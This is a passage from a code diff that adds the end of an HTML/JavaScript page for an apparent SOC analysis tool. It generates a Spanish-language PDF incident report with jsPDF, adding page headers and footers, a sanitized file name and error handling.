+        doc.setTextColor(60,75,95); doc.text(l,ML+4,y); y+=3.4;
+      });
+      y+=1.1;
+    });
+    doc.setFont('helvetica','normal'); y+=4;
+    P(`Documento generado por CyberSOC Analyst · ${nowStr()} · Analista SOC L2: ${analyst}`,9,'italic');
+
+    /* ---- PIE / CABECERA POR PÁGINA ---- */
+    const total=doc.getNumberOfPages();
+    for(let p=2;p<=total;p++){
+      doc.setPage(p);
+      doc.setDrawColor(6,182,212); doc.setLineWidth(.5); doc.line(ML,12,MR,12);
+      doc.setFont('helvetica','normal'); doc.setFontSize(7.5); doc.setTextColor(120,140,165);
+      doc.text('CONFIDENCIAL · Informe Técnico de Ciberseguridad · '+state.fileName.slice(0,60),ML,9);
+      doc.text(`Página ${p} de ${total}`,MR,9,{align:'right'});
+      doc.text(`Analista SOC L2: ${analyst}`,ML,292);
+      doc.text(`CyberSOC Analyst · ${new Date().toISOString().slice(0,10)}`,MR,292,{align:'right'});
+    }
+    const safeName=state.fileName.replace(/\.[^.]+$/,'').replace(/[^\w\-]+/g,'_').slice(0,40);
+    doc.save(`Informe_SOC_${safeName||'incidente'}_${new Date().toISOString().slice(0,10)}.pdf`);
+    toast('✅ Informe PDF exportado correctamente (incluye Anexo A con los '+susp.length+' eventos de riesgo).');
+  }catch(err){
+    console.error(err);
+    toast('Error al generar el PDF: '+err.message+'. Verifica los datos e inténtalo de nuevo.','err');
+  }
+}
+
+/* ============================================================
+   VARIOS
+============================================================ */
+$('analystName').addEventListener('input',e=>{ state.analyst=e.target.value; });
+window.addEventListener('beforeunload',e=>{ if(state.rows.length){ e.preventDefault(); e.returnValue=''; } });
+</script>
+</body>
+</html>
